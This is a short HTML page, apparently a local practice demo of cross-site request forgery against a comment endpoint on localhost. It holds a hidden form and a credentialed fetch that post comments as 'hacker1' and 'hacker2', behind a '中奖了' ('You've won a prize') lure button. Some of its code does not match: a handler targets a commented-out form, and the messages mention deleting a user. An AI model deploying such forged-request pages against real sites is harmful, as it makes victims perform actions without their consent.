<!doctype html>
<html lang="en" class="dark">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  </head>
  <body>
    <!-- <form id="myForm" onsubmit="submitForm"> -->
    <form action="http://localhost:3000/addComment" method="POST">
        <input type="hidden" name="name" value="hacker2" />
        <input type="hidden" name="comment" value="hack" />
        <button type="submit">中奖了</button>
    </form>
    <script>
        document.getElementById('myForm').addEventListener('submit', function(event) {
            // 阻止默认的表单提交行为
            event.preventDefault()
            console.error('submitForm')

            fetch('http://localhost:3000/addComment', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        name: 'hacker1',
                        comment: 'hack',
                    }),
                    credentials: 'include',
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert('User deleted successfully')
                    } else {
                        alert('Failed to delete user')
                    }
                })
                .catch(error => {
                    console.error('Error:', error)
                })
        })
        function submitForm (event) {
            console.error('submitForm')
            // 阻止默认的表单提交行为
            event.preventDefault()
            // Simulate an AJAX request to delete the user
            // In a real application, this would be an actual API call
            // fetch('http://localhost:3000/addComment', {
            //         method: 'POST',
            //         headers: {
            //             'Content-Type': 'application/json',
            //         },
            //         body: JSON.stringify({
            //             name: 'hacker1',
            //             comment: 'hack',
            //         }),
            //     })
            //     .then(response => response.json())
            //     .then(data => {
            //         if (data.success) {
            //             alert('User deleted successfully')
            //         } else {
            //             alert('Failed to delete user')
            //         }
            //     })
            //     .catch(error => {
            //         console.error('Error:', error)
            //     })
        }
    </script>
  </body>
</html>
